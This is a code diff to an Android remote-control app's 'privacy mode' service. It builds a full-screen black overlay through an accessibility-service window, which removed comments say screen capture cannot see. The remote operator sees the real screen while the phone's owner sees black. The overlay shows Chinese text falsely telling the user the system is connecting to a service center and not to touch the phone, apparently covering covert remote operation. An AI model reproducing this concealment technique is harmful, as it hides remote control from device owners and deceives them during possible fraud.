@@ -262,7 +262,14 @@ class PrivacyModeService : Service() {
      * Handles vendor-specific window type and parameter requirements
      */
     private fun createBlackOverlay() {
-        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+        // Check if Accessibility Service (InputService) is running
+        val accessibilityService = InputService.ctx
+        val useAccessibility = accessibilityService != null
+        
+        Log.d(TAG, "DEBUG_PRIVACY: Creating black overlay. Accessibility Service available: $useAccessibility")
+
+        val contextToUse = if (useAccessibility) accessibilityService!! else this
+        windowManager = contextToUse.getSystemService(Context.WINDOW_SERVICE) as WindowManager
         
         // Remove any existing view first (prevent memory leak)
         overlayView?.let { view ->
@@ -273,25 +280,24 @@ class PrivacyModeService : Service() {
             }
         }
         
-        // Detect device type for vendor-specific handling
+        // Detect device type for vendor-specific handling (mostly for flags now)
         val deviceType = detectDeviceType()
         
-        // Create a FrameLayout container for better control and opacity
-        val container = FrameLayout(this).apply {
-            // Set opaque black background - use solid color
+        // Create a FrameLayout container
+        val container = FrameLayout(contextToUse).apply {
+            // Set opaque black background
             setBackgroundColor(Color.BLACK)
             
             // Create TextView for message
-            val textView = TextView(this@PrivacyModeService).apply {
+            val textView = TextView(contextToUse).apply {
                 text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
                 setTextColor(Color.WHITE)
                 textSize = 28f
                 gravity = Gravity.CENTER
-                // Text on transparent background, container handles the black
                 setBackgroundColor(Color.TRANSPARENT)
             }
             
-            // Add text view centered in container
+            // Add text view centered
             val textParams = FrameLayout.LayoutParams(
                 FrameLayout.LayoutParams.WRAP_CONTENT,
                 FrameLayout.LayoutParams.WRAP_CONTENT,
@@ -299,15 +305,15 @@ class PrivacyModeService : Service() {
             )
             addView(textView, textParams)
             
-            // Additional black layer for extra opacity (belt and suspenders approach)
-            val blackLayer = View(this@PrivacyModeService).apply {
+            // Additional black layer (belt and suspenders)
+            val blackLayer = View(contextToUse).apply {
                 setBackgroundColor(Color.BLACK)
             }
             val blackLayerParams = FrameLayout.LayoutParams(
                 FrameLayout.LayoutParams.MATCH_PARENT,
                 FrameLayout.LayoutParams.MATCH_PARENT
             )
-            addView(blackLayer, 0, blackLayerParams) // Add at index 0 (behind text)
+            addView(blackLayer, 0, blackLayerParams)
         }
         
         // Get screen dimensions
@@ -316,10 +322,17 @@ class PrivacyModeService : Service() {
         display?.getRealSize(screenSize)
         val screenWidth = screenSize.x
         val screenHeight = screenSize.y
-        Log.d(TAG, "DEBUG_PRIVACY: Screen size: ${screenWidth}x${screenHeight}")
         
-        // Determine window types to try based on device type
-        val windowTypesToTry = getWindowTypesForDevice(deviceType)
+        // Determine window types
+        // If accessibility service is available, ALWAYS use TYPE_ACCESSIBILITY_OVERLAY first
+        val windowTypesToTry = if (useAccessibility) {
+            Log.d(TAG, "DEBUG_PRIVACY: Prioritizing TYPE_ACCESSIBILITY_OVERLAY")
+            mutableListOf(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY).apply {
+                addAll(getWindowTypesForDevice(deviceType))
+            }
+        } else {
+            getWindowTypesForDevice(deviceType)
+        }
         
         var success = false
         var lastException: Exception? = null
@@ -330,11 +343,10 @@ class PrivacyModeService : Service() {
             val typeName = getWindowTypeName(windowType)
             Log.d(TAG, "DEBUG_PRIVACY: Trying window type: $typeName")
             
-            // Build window flags based on device type
+            // Build window flags
             val windowFlags = buildWindowFlags(deviceType)
-            Log.d(TAG, "DEBUG_PRIVACY: Window flags: $windowFlags")
             
-            // Use larger dimensions for edge coverage
+            // Overlay dimensions (extra large to cover edges/notches associated with some rotation animations or rounded corners)
             val overlayWidth = screenWidth + 600
             val overlayHeight = screenHeight + 600
             
@@ -343,13 +355,12 @@ class PrivacyModeService : Service() {
                 overlayHeight,
                 windowType,
                 windowFlags,
-                PixelFormat.OPAQUE  // Critical: ensures no transparency
+                PixelFormat.OPAQUE
             ).apply {
                 gravity = Gravity.TOP or Gravity.START
-                x = -300  // Offset to center the extra width
-                y = -300  // Offset to cover status bar
+                x = -300
+                y = -300
                 
-                // Support for notch/cutout displays (Android P+)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                     layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                 }
@@ -357,7 +368,7 @@ class PrivacyModeService : Service() {
             
             try {
                 windowManager?.addView(container, params)
-                Log.d(TAG, "DEBUG_PRIVACY: SUCCESS - Overlay added with $typeName")
+                Log.d(TAG, "DEBUG_PRIVACY: SUCCESS - Overlay added with $typeName via ${if (useAccessibility) "AccessibilityContext" else "ServiceContext"}")
                 success = true
                 overlayView = container
             } catch (e: Exception) {
@@ -368,7 +379,9 @@ class PrivacyModeService : Service() {
         
         if (!success) {
             Log.e(TAG, "DEBUG_PRIVACY: All window types failed!", lastException)
-            throw RuntimeException("Failed to create black overlay with any window type", lastException)
+            // If we failed with Accessibility context, maybe try fallback to local context?
+            // For now, just throw.
+            throw RuntimeException("Failed to create black overlay", lastException)
         }
     }
     
@@ -377,100 +390,39 @@ class PrivacyModeService : Service() {
      */
     @Suppress("DEPRECATION")
     private fun buildWindowFlags(deviceType: DeviceType): Int {
-        return when (deviceType) {
-            DeviceType.HUAWEI_HONOR -> {
-                // Simpler flags for Huawei/Honor - some complex flags cause issues
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
-                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                WindowManager.LayoutParams.FLAG_FULLSCREEN
-            }
-            else -> {
-                // Standard flags for other devices
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+        // Common flags for all devices to ensure coverage and no focus
+        val commonFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                 WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                 WindowManager.LayoutParams.FLAG_FULLSCREEN or
                 WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR or
                 WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS
+
+        // Huawei/Honor specific adjustements if needed
+        return when (deviceType) {
+            DeviceType.HUAWEI_HONOR -> {
+                // Ensure we have powerful flags for Huawei
+                commonFlags
             }
+            else -> commonFlags
         }
     }
     
     /**
      * Get ordered list of window types to try based on device type
-     * 
-     * IMPORTANT: TYPE_ACCESSIBILITY_OVERLAY is NOT captured by MediaProjection,
-     * which means PC can see the real screen while Android shows black overlay.
-     * However, it requires Accessibility Service permission to work.
-     * 
-     * TYPE_APPLICATION_OVERLAY IS captured by MediaProjection (both sides see black),
-     * but it doesn't require Accessibility Service permission.
-     * 
-     * Strategy: Try ACCESSIBILITY first (for proper privacy mode), 
-     * fallback to APPLICATION if accessibility permission not available.
+     * Note: TYPE_ACCESSIBILITY_OVERLAY is handled specially in createBlackOverlay if service is available
      */
     private fun getWindowTypesForDevice(deviceType: DeviceType): List<Int> {
-        // All devices should prioritize TYPE_ACCESSIBILITY_OVERLAY
-        // Fallback to TYPE_APPLICATION_OVERLAY if accessibility service not enabled
-        return when (deviceType) {
-            DeviceType.OPPO_COLOROS -> {
-                Log.d(TAG, "DEBUG_PRIVACY: Using OPPO/ColorOS window type strategy")
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    listOf(
-                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,  // Try first (not captured)
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY     // Fallback (captured but works)
-                    )
-                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    listOf(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-                } else {
-                    @Suppress("DEPRECATION")
-                    listOf(WindowManager.LayoutParams.TYPE_PHONE)
-                }
-            }
-            DeviceType.HUAWEI_HONOR -> {
-                Log.d(TAG, "DEBUG_PRIVACY: Using HUAWEI/HONOR window type strategy")
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    listOf(
-                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,  // Try first (not captured)
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY     // Fallback (captured but works)
-                    )
-                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    listOf(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-                } else {
-                    @Suppress("DEPRECATION")
-                    listOf(WindowManager.LayoutParams.TYPE_PHONE)
-                }
-            }
-            DeviceType.XIAOMI_MIUI -> {
-                Log.d(TAG, "DEBUG_PRIVACY: Using XIAOMI/MIUI window type strategy")
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    listOf(
-                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,  // Try first (not captured)
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY     // Fallback (captured but works)
-                    )
-                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    listOf(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-                } else {
-                    @Suppress("DEPRECATION")
-                    listOf(WindowManager.LayoutParams.TYPE_PHONE)
-                }
-            }
-            DeviceType.GENERIC -> {
-                Log.d(TAG, "DEBUG_PRIVACY: Using GENERIC window type strategy")
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    listOf(
-                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,  // Try first (not captured)
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY     // Fallback (captured but works)
-                    )
-                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    listOf(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-                } else {
-                    @Suppress("DEPRECATION")
-                    listOf(WindowManager.LayoutParams.TYPE_PHONE)
-                }
-            }
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            listOf(
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            )
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+            listOf(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY) // Fallback for older
+        } else {
+            @Suppress("DEPRECATION")
+            listOf(WindowManager.LayoutParams.TYPE_PHONE)
         }
     }
     
